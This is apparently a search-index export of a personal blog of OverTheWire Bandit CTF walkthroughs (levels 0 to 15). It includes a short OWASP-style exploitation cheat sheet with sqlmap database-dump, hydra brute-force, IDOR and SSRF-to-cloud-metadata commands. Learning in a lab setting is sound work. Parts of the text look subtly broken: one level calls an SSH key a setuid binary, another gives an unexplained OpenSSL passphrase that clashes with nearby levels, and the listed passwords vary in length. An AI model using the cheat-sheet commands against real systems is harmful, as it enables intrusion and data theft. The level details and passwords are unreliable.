{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83e\udde0 OverTheWire CTF Writeups","text":""},{"location":"#authored-by-cybermage07","title":"\u270d\ufe0f Authored by CyberMage07","text":"<p>Welcome to a curated collection of writeups for the OverTheWire wargames \u2014 a series of hands-on CTF challenges designed to enhance practical skills in cybersecurity, ethical hacking, and problem-solving.  </p> <p>This site features step-by-step walkthroughs, thoughtful explanations, and tactical insights aimed at learners, hobbyists, and aspiring professionals in the field.</p> <p>\u26a1 Whether you're just beginning your CTF journey or revisiting the core principles of hacking, this resource is built to support and accelerate your learning.</p>"},{"location":"#what-youll-find-here","title":"\u2694\ufe0f What You\u2019ll Find Here","text":"<p>This documentation includes comprehensive writeups for several OverTheWire wargames \u2014 each challenge crafted to strengthen different aspects of your cybersecurity mindset and technical capability.</p> <p>The content focuses not just on solutions, but also on the reasoning and approach behind each level, making it a helpful guide for learners who value both depth and clarity.</p>"},{"location":"#about-the-author","title":"\ud83e\uddd1\u200d\ud83d\udcbb About the Author","text":"<p>CyberMage07 is a cybersecurity practitioner, CTF competitor, and red team enthusiast, with interests in:</p> <ul> <li>Offensive security &amp; system exploitation  </li> <li>Red Teaming methodologies  </li> <li>Vulnerability Assessment and Penetration Testing</li> </ul> <p>\ud83e\udde0 GitHub: CyberMage07 \ud83d\udcbc LinkedIn: Shaunak Deshmukh</p> <p>Feedback, suggestions, and contributions are always welcome via issues or pull requests.</p>"},{"location":"#how-to-navigate","title":"\ud83d\ude80 How to Navigate","text":"<ul> <li>\ud83d\udcda Use the sidebar to explore available wargame writeups.  </li> <li>\ud83d\udd0e Use the search bar to locate specific techniques, tools, or keywords.</li> </ul> <p>\ud83d\udca1 \u201cLet the terminal be your playground, and curiosity your greatest tool.\u201d \u2014 CyberMage07</p> <p>Happy Hacking! \u2694\ufe0f\ud83d\udd25</p>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/","title":"VAPT Exploitation Cheat Sheet","text":"<p>This repository serves as a one-stop guide for identifying and exploiting vulnerabilities across the OWASP Top 10 categories.</p>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#broken-access-control","title":"\ud83d\udd10 Broken Access Control","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection","title":"\ud83d\udd0d Detection","text":"<pre><code># Try accessing an unauthorized endpoint\ncurl -b \"auth_token=...\" http://target/admin\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#exploitation","title":"\ud83c\udfaf Exploitation","text":"<pre><code># IDOR exploitation example\ncurl http://target/api/user/2\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#cryptographic-failures","title":"\ud83d\udd10 Cryptographic Failures","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_1","title":"\ud83d\udd0d Detection","text":"<pre><code># Check for missing HTTPS, weak ciphers\nsslscan target.com\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#exploitation_1","title":"\ud83c\udfaf Exploitation","text":"<pre><code># Downgrade attack (if possible)\nsslyze --regular target.com\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#injection-sqli-command-injection-etc","title":"\ud83e\uddea Injection (SQLi, Command Injection, etc.)","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_2","title":"\ud83d\udd0d Detection","text":"<pre><code>sqlmap -u \"http://target.com/product.php?id=1\" --batch --level=5 --risk=3\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#exploitation_2","title":"\ud83c\udfaf Exploitation","text":"<pre><code># Exploit with sqlmap to dump DB\nsqlmap -u \"http://target.com/product.php?id=1\" --dump\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#insecure-design","title":"\ud83d\udcd0 Insecure Design","text":"<ul> <li> <p>Manual Testing Needed:</p> <ul> <li> <p>Unprotected workflows</p> </li> <li> <p>Weak logic in password reset</p> </li> <li> <p>Lack of rate limiting</p> </li> </ul> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#security-misconfiguration","title":"\u2699\ufe0f Security Misconfiguration","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_3","title":"\ud83d\udd0d Detection","text":"<pre><code>nuclei -u http://target.com\nnikto -h http://target.com\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#exploitation_3","title":"\ud83c\udfaf Exploitation","text":"<pre><code># Exploit default creds if found\nhydra -l admin -P rockyou.txt http://target.com/login\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#vulnerable-outdated-components","title":"\ud83e\uddf1 Vulnerable &amp; Outdated Components","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_4","title":"\ud83d\udd0d Detection","text":"<pre><code>whatweb http://target.com\nnmap --script vulners -sV target.com\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#identification-authentication-failures","title":"\ud83d\udeb2 Identification &amp; Authentication Failures","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_5","title":"\ud83d\udd0d Detection","text":"<pre><code># Check for missing MFA, brute-forceable logins\nhydra -l admin -P rockyou.txt http://target.com/login\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#software-data-integrity-failures","title":"\ud83d\udd12 Software &amp; Data Integrity Failures","text":"<ul> <li> <p>Manual and Dependency Tool Testing:</p> <ul> <li> <p>Check source maps, misconfigured CI/CD</p> </li> <li> <p>Tools: <code>npm audit</code>, <code>trivy</code>, <code>retire.js</code></p> </li> </ul> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#security-logging-monitoring-failures","title":"\ud83d\udcdc Security Logging &amp; Monitoring Failures","text":"<ul> <li> <p>Detection:</p> <ul> <li> <p>No logs for auth events</p> </li> <li> <p>Manual review required</p> </li> </ul> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#ssrf-server-side-request-forgery","title":"\ud83c\udf10 SSRF (Server-Side Request Forgery)","text":""},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#detection_6","title":"\ud83d\udd0d Detection","text":"<pre><code># Common SSRF payload\ncurl -X POST http://target.com/fetch?url=http://127.0.0.1:80\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/VAPT%20Practical%20Cheat%20Sheet/#exploitation_4","title":"\ud83c\udfaf Exploitation","text":"<pre><code># Try accessing AWS metadata\ncurl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%200%20%E2%86%92%20Level%201/","title":"Level 0 \u2192 1","text":"<p>Challenge URL: Bandit Level 0</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%200%20%E2%86%92%20Level%201/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The goal of this level is to log into the game using SSH. The host to which you need to connect is:</p> <p><code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code></p> <p>The password for the next level is stored in a file called <code>readme</code>, located in the home directory.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%200%20%E2%86%92%20Level%201/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This challenge tests your ability to:</p> <ul> <li> <p>Use SSH to log into a remote Linux machine.</p> </li> <li> <p>List files using <code>ls</code></p> </li> <li> <p>Read file contents using <code>cat</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%200%20%E2%86%92%20Level%201/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into the target machine using the given credentials:</p> <p><code>bash ssh bandit0@bandit.labs.overthewire.org -p 2220</code></p> <ul> <li> <p>You\u2019ll get a prompt to accept the server fingerprint.</p> </li> <li> <p>Then, you'll be prompted for the password for user <code>bandit0</code>.</p> </li> </ul> </li> <li> <p>Once logged in, list files in the current directory:</p> <p><code>bash ls</code></p> <ul> <li>You\u2019ll see a file named <code>readme</code>.</li> </ul> </li> <li> <p>Read the contents of <code>readme</code> using <code>cat</code>:</p> <p><code>bash cat readme</code></p> <p>Output:</p> <p><code>ZzLjTmM6FvvyRnrb2rfNWOZOTa6ip5If</code></p> <p>This is the password for Bandit Level 1.</p> </li> <li> <p>Logout from the session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%200%20%E2%86%92%20Level%201/#password-for-bandit-level-1","title":"\ud83d\udd11 Password for Bandit Level 1:","text":"<pre><code>ZzLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%201%20%E2%86%92%20Level%202/","title":"Level 1 \u2192 2","text":"<p>Challenge URL: Bandit Level 1</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%201%20%E2%86%92%20Level%202/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in a file called <code>-</code>. The file is located in the home directory.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%201%20%E2%86%92%20Level%202/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches how to:</p> <ul> <li> <p>Handle files with names that start with special characters like <code>-</code></p> </li> <li> <p>Use escape techniques or double-dot prefixing to avoid command misinterpretation</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%201%20%E2%86%92%20Level%202/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit Level 1:</p> <p><code>bash ssh bandit1@bandit.labs.overthewire.org -p 2220</code></p> <ul> <li>Use the password obtained from Level 0 (<code>ZzLjTmM6FvvyRnrb2rfNWOZOTa6ip5If</code>).</li> </ul> </li> <li> <p>Check the home directory contents:</p> <p><code>bash ls -alh</code></p> <ul> <li>You'll see a suspiciously named file: <code>-</code></li> </ul> </li> <li> <p>Attempt to read the file using <code>cat -</code> (fails):</p> <p><code>bash cat -</code></p> <ul> <li>This treats <code>-</code> as STDIN, not a filename.</li> </ul> </li> <li> <p>Correct way: use relative path prefix <code>./</code> to escape the special meaning:</p> <p><code>bash cat ./-</code></p> <p>Output:</p> <p><code>263JGPf9u6LDtvtf6vFUW1XP5yac29mFx</code></p> <p>This is the password for Bandit Level 2.</p> </li> <li> <p>Exit the SSH session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%201%20%E2%86%92%20Level%202/#password-for-bandit-level-2","title":"\ud83d\udd11 Password for Bandit Level 2:","text":"<pre><code>263JGPf9u6LDtvtf6vFUW1XP5yac29mFx\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2010%20%E2%86%92%20Level%2011/","title":"Level 10 \u2192 11","text":"<p>Challenge URL: Bandit Level 10</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2010%20%E2%86%92%20Level%2011/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the file <code>data.txt</code>, which contains base64 encoded text.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2010%20%E2%86%92%20Level%2011/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches:</p> <ul> <li> <p>Identifying and decoding base64-encoded content</p> </li> <li> <p>Using the <code>base64</code> command-line tool</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2010%20%E2%86%92%20Level%2011/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit10:</p> <p><code>bash ssh bandit10@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Check the contents of <code>data.txt</code>:</p> <p><code>bash cat data.txt</code></p> <p>You'll see a long base64-encoded string.</p> </li> <li> <p>Decode it using <code>base64 -d</code>:</p> <p><code>bash cat data.txt | base64 -d</code></p> <p>Output:</p> <p><code>The password is dt1eRM2zF7hvLHlH5KkZcwYHUo6YczR6</code></p> </li> <li> <p>Logout once done:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2010%20%E2%86%92%20Level%2011/#password-for-bandit-level-11","title":"\ud83d\udd11 Password for Bandit Level 11:","text":"<pre><code>dt1eRM2zF7hvLHlH5KkZcwYHUo6YczR6\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2011%20%E2%86%92%20Level%2012/","title":"Level 11 \u2192 12","text":"<p>Challenge URL: Bandit Level 11</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2011%20%E2%86%92%20Level%2012/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the file <code>data.txt</code>, which contains a hex dump of a file that has been compressed repeatedly. Your task is to reverse the decompression to retrieve the password.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2011%20%E2%86%92%20Level%2012/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>Hex dumps (<code>xxd -r</code>)</p> </li> <li> <p>Multiple compression formats: gzip, bzip2, tar</p> </li> <li> <p>Extracting and working with files in <code>/tmp</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2011%20%E2%86%92%20Level%2012/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit11:</p> <p><code>bash ssh bandit11@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Create and switch to a temp directory:</p> <p><code>bash mkdir /tmp/tempf &amp;&amp; cd /tmp/tempf</code></p> </li> <li> <p>Copy the data file:</p> <p><code>bash cp ~/data.txt .</code></p> </li> <li> <p>Convert hex dump back to binary:</p> <p><code>bash xxd -r data.txt binary</code></p> </li> <li> <p>Iteratively detect and decompress formats:</p> <p><code>bash file binary gzip -d binary file binary bunzip2 binary file binary tar -xf binary</code></p> <p>Repeat this as shown in the screenshot until you reach the final readable file.</p> </li> <li> <p>Final output (from <code>cat</code> on the ASCII text file):</p> <p><code>bash cat data8</code></p> <p>Output:</p> <p><code>The password is F05wY0XDiHoRo1ZDTXWTn9V7sT1kLmgc</code></p> </li> <li> <p>Logout:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2011%20%E2%86%92%20Level%2012/#password-for-bandit-level-12","title":"\ud83d\udd11 Password for Bandit Level 12:","text":"<pre><code>F05wY0XDiHoRo1ZDTXWTn9V7sT1kLmgc\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2012%20%E2%86%92%20Level%2013/","title":"Level 12 \u2192 13","text":"<p>Challenge URL: Bandit Level 12</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2012%20%E2%86%92%20Level%2013/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the file <code>data.txt</code>, but it is encrypted using OpenSSL and the AES-256-CBC cipher. The decryption password is \u201cnotexplained\u201d.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2012%20%E2%86%92%20Level%2013/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches:</p> <ul> <li> <p>Decrypting files encrypted with OpenSSL using <code>openssl enc -d</code></p> </li> <li> <p>Understanding symmetric encryption with a passphrase</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2012%20%E2%86%92%20Level%2013/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit12:</p> <p><code>bash ssh bandit12@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>View file type to confirm encryption:</p> <p><code>bash file data.txt</code></p> <p>Output:</p> <p><code>data.txt: openssl enc'd data with salted password</code></p> </li> <li> <p>Decrypt using <code>openssl</code>:</p> <p><code>bash openssl enc -d -aes-256-cbc -in data.txt -out decrypted.txt -k notexplained</code></p> </li> <li> <p>Display decrypted content:</p> <p><code>bash cat decrypted.txt</code></p> <p>Output:</p> <p><code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p> </li> <li> <p>Logout:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2012%20%E2%86%92%20Level%2013/#password-for-bandit-level-13","title":"\ud83d\udd11 Password for Bandit Level 13:","text":"<pre><code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2013%20%E2%86%92%20Level%2014/","title":"Level 13 \u2192 14","text":"<p>Challenge URL: Bandit Level 13</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2013%20%E2%86%92%20Level%2014/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in <code>etc/bandit_pass/bandit14</code>, but you do not have permission to read it directly. However, there is a setuid binary called <code>./sshkey.private</code> that will help you log in as bandit14 using SSH.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2013%20%E2%86%92%20Level%2014/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>SSH key-based login</p> </li> <li> <p>Understanding and using private SSH keys</p> </li> <li> <p>Running a setuid binary to escalate privileges securely</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2013%20%E2%86%92%20Level%2014/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit13:</p> <p><code>bash ssh bandit13@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Check for the SSH private key:</p> <p><code>bash ls</code></p> <p>Output:</p> <p><code>sshkey.private</code></p> </li> <li> <p>Set correct permissions:</p> <p><code>bash chmod 600 sshkey.private</code></p> </li> <li> <p>Use the key to login as bandit14:</p> <p><code>bash ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>You\u2019ll be logged in directly as bandit14. Now retrieve the password:</p> <p><code>bash cat /etc/bandit_pass/bandit14</code></p> <p>Output:</p> <p><code>8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</code></p> </li> <li> <p>Logout from bandit14:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2013%20%E2%86%92%20Level%2014/#password-for-bandit-level-14","title":"\ud83d\udd11 Password for Bandit Level 14:","text":"<pre><code>8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2014%20%E2%86%92%20Level%2015/","title":"Level 14 \u2192 15","text":"<p>Challenge URL: Bandit Level 14</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2014%20%E2%86%92%20Level%2015/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is retrieved via SSH on localhost, using a public/private key pair. You must use the provided private key to authenticate to user <code>bandit15</code>.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2014%20%E2%86%92%20Level%2015/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level tests:</p> <ul> <li> <p>Using SSH keys to log into another user\u2019s account on localhost</p> </li> <li> <p>Understanding key-based SSH authentication</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2014%20%E2%86%92%20Level%2015/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit14:</p> <p><code>bash ssh bandit14@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>List the private key file:</p> <p><code>bash ls</code></p> <p>You\u2019ll see:</p> <p><code>sshkey.private</code></p> </li> <li> <p>Set the right permissions:</p> <p><code>bash chmod 600 sshkey.private</code></p> </li> <li> <p>SSH into localhost as bandit15 using the key:</p> <p><code>bash ssh -i sshkey.private bandit15@localhost</code></p> </li> <li> <p>Once logged in, read the password:</p> <p><code>bash cat /etc/bandit_pass/bandit15</code></p> <p>Output:</p> <p><code>TLWrGzQlinKfCOmpt9ES9w2GcxZiYH79</code></p> </li> <li> <p>Logout from bandit15 session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%2014%20%E2%86%92%20Level%2015/#password-for-bandit-level-15","title":"\ud83d\udd11 Password for Bandit Level 15:","text":"<pre><code>TLWrGzQlinKfCOmpt9ES9w2GcxZiYH79\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%202%20%E2%86%92%20Level%203/","title":"Level 2 \u2192 3","text":"<p>Challenge URL: Bandit Level 2</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%202%20%E2%86%92%20Level%203/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in a file called <code>spaces in this filename</code> located in the home directory.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%202%20%E2%86%92%20Level%203/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li>Filenames with spaces, which must be handled using quotes or escape characters.</li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%202%20%E2%86%92%20Level%203/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into the machine:</p> <p><code>bash ssh bandit2@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Check file listing:</p> <p><code>bash ls -alh</code></p> <p>You\u2019ll see:</p> <p><code>spaces in this filename</code></p> </li> <li> <p>Read the file using quotes:</p> <p><code>bash cat 'spaces in this filename'</code></p> <p>Output:</p> <p><code>MNK8NHSJUi6o4IRUEDOFgFqtxPLSlSmx</code></p> </li> <li> <p>Logout once done:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%202%20%E2%86%92%20Level%203/#password-for-bandit-level-3","title":"\ud83d\udd11 Password for Bandit Level 3:","text":"<pre><code>MNK8NHSJUi6o4IRUEDOFgFqtxPLSlSmx\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%203%20%E2%86%92%20Level%204/","title":"Level 3 \u2192 4","text":"<p>Challenge URL: Bandit Level 3</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%203%20%E2%86%92%20Level%204/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in a hidden file in the inhere directory.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%203%20%E2%86%92%20Level%204/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>Navigating directories</p> </li> <li> <p>Listing hidden files using <code>ls -a</code></p> </li> <li> <p>Understanding how <code>.</code> and <code>..</code> work</p> </li> <li> <p>Reading hidden files</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%203%20%E2%86%92%20Level%204/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit3:</p> <p><code>bash ssh bandit3@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>List files and go into <code>inhere</code>:</p> <p><code>bash ls -alh cd inhere</code></p> </li> <li> <p>Find the hidden file:</p> <p><code>bash ls -alh</code></p> <p>Output shows a file like:</p> <p><code>.hidden</code></p> </li> <li> <p>Display the contents of the hidden file:</p> <p><code>bash cat .hidden</code></p> <p>Output:</p> <p><code>ZWmrDRF3JMJd3PEt1ZaaMGPhrpG0aFhF3N</code></p> </li> <li> <p>Logout after completing the level:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%203%20%E2%86%92%20Level%204/#password-for-bandit-level-4","title":"\ud83d\udd11 Password for Bandit Level 4:","text":"<pre><code>ZWmrDRF3JMJd3PEt1ZaaMGPhrpG0aFhF3N\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%204%20%E2%86%92%20Level%205/","title":"Level 4 \u2192 5","text":"<p>Challenge URL: Bandit Level 4</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%204%20%E2%86%92%20Level%205/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: Many files are binary, only one contains readable ASCII text.</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%204%20%E2%86%92%20Level%205/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level teaches:</p> <ul> <li> <p>Using the <code>file</code> command to detect file types</p> </li> <li> <p>Filtering human-readable (ASCII) files</p> </li> <li> <p>Reading file contents via <code>cat</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%204%20%E2%86%92%20Level%205/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit4:</p> <p><code>bash ssh bandit4@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Navigate into the <code>inhere</code> directory:</p> <p><code>bash cd inhere</code></p> </li> <li> <p>Identify file types:</p> <p><code>bash file ./*</code></p> <p>Output (sample):</p> <p><code>./-file00: data   ./-file01: data   ./-file02: data   ... ./-file07: ASCII text ...</code></p> </li> <li> <p>Read the ASCII text file using escape prefix <code>./</code>:</p> <p><code>bash cat ./-file07</code></p> <p>Output:</p> <p><code>tQKcUPy4xX0Eoo05PwT8W1BFj8BJxXxGUGUw</code></p> </li> <li> <p>Logout from the session:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%204%20%E2%86%92%20Level%205/#password-for-bandit-level-5","title":"\ud83d\udd11 Password for Bandit Level 5:","text":"<pre><code>tQKcUPy4xX0Eoo05PwT8W1BFj8BJxXxGUGUw\n</code></pre>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%205%20%E2%86%92%20Level%206/","title":"Level 5 \u2192 6","text":"<p>Challenge URL: Bandit Level 5</p>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%205%20%E2%86%92%20Level%206/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The password for the next level is stored in a file somewhere under the <code>inhere</code> directory and has the following properties:</p> <ul> <li> <p>It is human-readable</p> </li> <li> <p>It is 1033 bytes in size</p> </li> <li> <p>It is not executable </p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%205%20%E2%86%92%20Level%206/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level tests:</p> <ul> <li> <p>Using <code>find</code> with multiple conditions (<code>-type</code>, <code>-size</code>, <code>-executable</code>)</p> </li> <li> <p>Filtering by file size</p> </li> <li> <p>Displaying specific file content</p> </li> </ul>"},{"location":"Over%20The%20Wire/Bandit/%F0%9F%93%98%20Bandit%20Level%205%20%E2%86%92%20Level%206/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Bandit5:</p> <p><code>bash ssh bandit5@bandit.labs.overthewire.org -p 2220</code></p> </li> <li> <p>Search using <code>find</code>:</p> <p><code>bash find inhere -type f -size 1033c ! -executable</code></p> <p>Output:</p> <p><code>inhere/maybehere07/.file2</code></p> </li> <li> <p>Read the file content:</p> <p><code>bash cat inhere/maybehere07/.file2</code></p> <p>Output:</p> <p><code>Z7WtoNQUuWYvwM2RqxqHkUDvZwS2ONQYEw</code></p> </li> <li> <p>Logout from session:</p> <p><code>bash exit</code></p> </li> 